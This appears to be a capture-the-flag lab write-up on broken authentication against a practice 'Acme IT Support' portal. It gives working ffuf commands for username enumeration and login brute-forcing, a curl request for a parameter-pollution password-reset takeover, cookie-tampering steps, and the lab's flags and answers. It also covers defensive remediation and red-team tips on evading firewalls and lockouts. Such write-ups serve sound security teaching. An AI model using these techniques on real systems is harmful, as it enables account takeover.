# Broken Authentication - Comprehensive Technical Guide

---

## 1. Room Overview & Architecture

Authentication constitutes the primary security perimeter of web applications. It serves as the authoritative gateway that verifies the identity of a client before granting access to protected system resources and role-based permissions. When authentication mechanisms break down or harbor logical flaws, adversaries can bypass identity checks, execute full account takeovers, and compromise institutional data integrity.

This module delivers an exhaustive technical breakdown of authentication vulnerabilities classified under **OWASP Top 10 A07:2021 (Identification and Authentication Failures)**. Operating against the realistic "Acme IT Support" target portal, we explore four key attack vectors: Username Enumeration via response differentials, multi-wordlist login brute-forcing via `ffuf`, password reset logic flaws via HTTP Parameter Pollution (HPP), and client-side cookie manipulation across plain text, unsalted MD5 hashes, and Base64-serialized data.

```
+-----------------------------------------------------------------------------------+
|                        BROKEN AUTHENTICATION LAB ARCHITECTURE                     |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Platform (Kali Linux)                     Target: Acme IT Support       |
|  ==============================                     =======================       |
|                                                                                   |
|  1. ffuf Enumeration -----------------------------> /customers/signup             |
|     (Matches: "username already exists")            Reveals: simon, steve, robert |
|                                                                                   |
|  2. ffuf Multi-Wordlist Brute Force --------------> /customers/login              |
|     (Filters Status 200 / Captures 302)             Cracks: steve / thunder       |
|                                                                                   |
|  3. HTTP Parameter Pollution (HPP) ---------------> /customers/reset              |
|     GET: ?email=robert@acmeitsupport.thm            Validates: robert exists!     |
|     POST: email=attacker@customer.acme...           Sends Token to Attacker Inbox!|
|     Account Takeover -----------------------------> Flag: THM{AUTH_BYPASS...}     |
|                                                                                   |
|  4. Cookie Tampering -----------------------------> /cookie-test                  |
|     Cookie: logged_in=true; admin=true              Flag: THM{COOKIE_TAMPERING}   |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 2. Target Audience & Prerequisites

* **Target Audience:**
  - Web Application Penetration Testers & Vulnerability Researchers.
  - Application Security (AppSec) Engineers and Backend Developers.
  - SOC Analysts, Threat Hunters, and Purple Team operators.
* **Prerequisites:**
  - Solid understanding of the HTTP/1.1 protocol specification (request methods, header fields, status codes).
  - Practical proficiency with command-line utilities (`curl`, `ffuf`) and web proxies (Burp Suite).
  - Familiarity with basic cryptographic principles (encoding vs hashing vs encryption).

---

## 3. Learning Objectives & Core Concepts

1. Categorize the four primary types of authentication bypass vulnerabilities.
2. Exploit differential error messages to enumerate registered user accounts.
3. Execute high-speed credential brute-force attacks using `ffuf` cluster-bomb modes.
4. Dissect the architectural root cause of HTTP Parameter Pollution (HPP) in PHP applications.
5. Hijack password reset workflows to achieve zero-interaction Account Takeover (ATO).
6. Manipulate client-controlled cookie states and reverse low-entropy hashes.

---

## 4. Theoretical Foundations & Technical Deep Dive

### 4.1 Username Enumeration Mechanics
Applications unintentionally disclose account existence through observable response discrepancies:
* **Error Message Variations:** Returning `"Username already taken"` versus generic registration confirmation.
* **HTTP Status Codes:** Differentiating between HTTP 404 (Not Found) and HTTP 401/403 (Unauthorized/Forbidden).
* **Cryptographic Timing Differentials:** Significant response latency introduced when the server computes expensive password hashes (e.g. Bcrypt/Argon2) for existing accounts versus immediate termination for non-existent users.

### 4.2 The Mechanics of HTTP Parameter Pollution (HPP)
In PHP applications, the `$_REQUEST` superglobal array merges data from `$_GET`, `$_POST`, and `$_COOKIE`. The precedence order is defined in `php.ini` via `request_order = "GP"`.
When the application performs validation:
1. It queries `$_GET['email']` (`robert@acmeitsupport.thm`), confirming that Robert is a legitimate customer.
2. It generates a valid reset token for Robert's account.
3. When querying the recipient email, it accesses `$_REQUEST['email']`. Because the POST body parameter overrides the GET parameter, the token is dispatched to the attacker's inbox (`steve@customer.acmeitsupport.thm`).

---

## 5. Practical Lab Topology & Attack Surface

* **Lab Endpoint:** Acme IT Support Portal running on Port 80 (`http://MACHINE_IP`).
* **Attack Surface:**
  - `/customers/signup`: User registration endpoint exposing account enumeration.
  - `/customers/login`: Authentication portal lacking account lockouts and rate limiting.
  - `/customers/reset`: Password recovery mechanism vulnerable to parameter pollution.
  - `/cookie-test`: Cookie debugging endpoint vulnerable to client-side state tampering.

---

## 6. Tools, Technologies & Protocols

* **Tools:**
  - `ffuf` (Fast web fuzzer written in Go).
  - `curl` (Command-line HTTP client for payload construction).
  - `SecLists` (`names.txt` and `10-million-password-list-top-100.txt`).
  - `CrackStation` (Online rainbow table engine).
* **Protocols:**
  - HTTP/1.1 (GET/POST methods, query parameters, cookie headers).

---

## 7. Step-by-Step Task Execution Matrix

| Task # | Task Title | Core Focus | Verified Outcome | Detailed Documentation |
| :---: | :--- | :--- | :---: | :---: |
| **01** | Introduction | Target environment setup & scope definition | `No answer needed` | [TASK-01.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-01.md) |
| **02** | Types of Authentication Bypass | Theoretical taxonomy & credential reuse | `Credential Reuse` | [TASK-02.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-02.md) |
| **03** | Username Enumeration | Fuzzing registration form for account existence | `simon`, `steve`, `robert` | [TASK-03.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-03.md) |
| **04** | Brute Forcing a Login Form | Multi-wordlist credential brute-forcing | `steve/thunder` | [TASK-04.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-04.md) |
| **05** | Logic Flaws (HPP) | Password reset hijacking & ATO | Flag: `THM{AUTH_BYPASS_COMPLETE}` | [TASK-05.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-05.md) |
| **06** | Cookie Manipulation | Cookie tampering, MD5 cracking, and Base64 | Flag: `THM{COOKIE_TAMPERING}` + 3 values | [TASK-06.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-06.md) |
| **07** | Conclusion | Synthesis of defensive controls & next room | `No answer needed` | [TASK-07.md](../../02-BROKEN-AUTHENTICATION/TASKS/TASK-07.md) |

---

## 8. Offensive Security Playbook

### Phase 1: User Enumeration via Differential Matching
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
     -X POST \
     -d "username=FUZZ&email=x&password=x&cpassword=x" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/signup \
     -mr "username already exists"
```
* Result: Valid accounts identified: `robert`, `simon`, `steve`.

### Phase 2: Credential Brute-Force (Cluster Bomb)
```bash
cat << 'EOF' > valid_usernames.txt
simon
steve
robert
EOF

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
     -X POST \
     -d "username=W1&password=W2" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://MACHINE_IP/customers/login \
     -fc 200
```
* Result: Valid credentials recovered: `steve` / `thunder`.

### Phase 3: HTTP Parameter Pollution Account Takeover
```bash
curl 'http://MACHINE_IP/customers/reset?email=robert@acmeitsupport.thm' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -d 'username=robert&email=steve@customer.acmeitsupport.thm'
```
* Navigate to Steve's ticket system, retrieve the reset token, update Robert's password, log in as Robert, and open the closed ticket:
  - Flag: **`THM{AUTH_BYPASS_COMPLETE}`**.

### Phase 4: Cookie State Tampering
```bash
# 1. Plain text cookie tampering:
curl -s http://MACHINE_IP/cookie-test -H "Cookie: logged_in=true; admin=true"
# -> Flag: THM{COOKIE_TAMPERING}

# 2. Reversing MD5 hash 3b2a1053e3270077456a79192070aa78:
# -> Value: 463729

# 3. Base64 Decoding VEhNe0JBU0U2NF9FTkNPRElOR30=:
echo -n "VEhNe0JBU0U2NF9FTkNPRElOR30=" | base64 -d
# -> Value: THM{BASE64_ENCODING}

# 4. Base64 Encoding {"id":1,"admin":true}:
echo -n '{"id":1,"admin":true}' | base64
# -> Value: eyJpZCI6MSwiYWRtaW4iOnRydWV9
```

---

## 9. Defensive & Remediation Blueprint

1. **Neutralize Username Enumeration:**
   - Return generic error messages on both login and signup forms: `"Invalid credentials or account already registered"`.
   - Dispatch an email notification rather than throwing visible registration errors.
2. **Harden Against Credential Brute-Forcing:**
   - Enforce account lockouts after 5 consecutive failed attempts.
   - Implement Multi-Factor Authentication (MFA/TOTP).
   - Enforce IP-based rate limiting with exponential backoff delays.
3. **Prevent HTTP Parameter Pollution:**
   - Ban `$_REQUEST` in production code. Explicitly read from `$_POST` or `$_GET`.
   - In password recovery, look up the target email exclusively from the database based on the verified user ID. Never accept destination emails from client parameters.
4. **Enforce Cookie & State Integrity:**
   - Maintain sessions in server-side stores (Redis/Memcached).
   - Sign client-side tokens using HMAC-SHA256 with cryptographically strong secret keys.

---

## 10. OpSec & Red Team Operational Tradecraft

* **Managing Automation Signatures:** High-volume fuzzing generates significant web server access log volume. Red teams must throttle tools (`-p 0.2 -t 5`) and rotate proxy pools to evade web application firewalls.
* **Password Spraying vs Brute Force:** In enterprise assessments, prefer password spraying (1 common password across many users) over brute-forcing (many passwords against 1 user) to bypass account lockout mechanisms.

---

## 11. Real-World Threat Intelligence & Case Studies

* **Credential Stuffing Operations:** Major organizations (e.g., PayPal, Yahoo, Roku) routinely mitigate millions of automated login attempts daily originating from residential proxy botnets replaying public breach corpuses.
* **HPP Vulnerabilities in Payment Gateways:** Threat actors have historically leveraged parameter pollution to overwrite merchant recipient IDs, diverting transaction funds to unauthorized accounts.

---

## 12. Comprehensive Troubleshooting & Edge Cases

* **Issue:** `ffuf` displays every request as a match.
  - **Root Cause:** Inaccurate filtering parameters.
  - **Resolution:** Manually trigger a failed request in Burp Suite, identify static status codes or body lengths, and filter using `-fc` or `-fs`.
* **Issue:** Password reset token email is not received.
  - **Root Cause:** Typographical error in the destination email domain (`@customer.acmeitsupport.thm`).

---

## 13. Knowledge Verification & Self-Assessment

1. How do differential error messages reduce the computational complexity of credential brute-forcing?
2. What underlying PHP language mechanism enables HTTP Parameter Pollution via `$_REQUEST`?
3. Why is Base64 encoding completely ineffective as a confidentiality mechanism?
4. How does Multi-Factor Authentication (MFA) defeat credential reuse attacks?

---

## 14. References & Further Reading

* [Authoritative References & Documentation](../../02-BROKEN-AUTHENTICATION/REFERENCES.md)
* [Deep Technical Notes & Architectural Comparison](../../02-BROKEN-AUTHENTICATION/ADDITIONAL-NOTES.md)
* [Task Matrix & Quick Reference](../../02-BROKEN-AUTHENTICATION/TASKS.md)
* [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
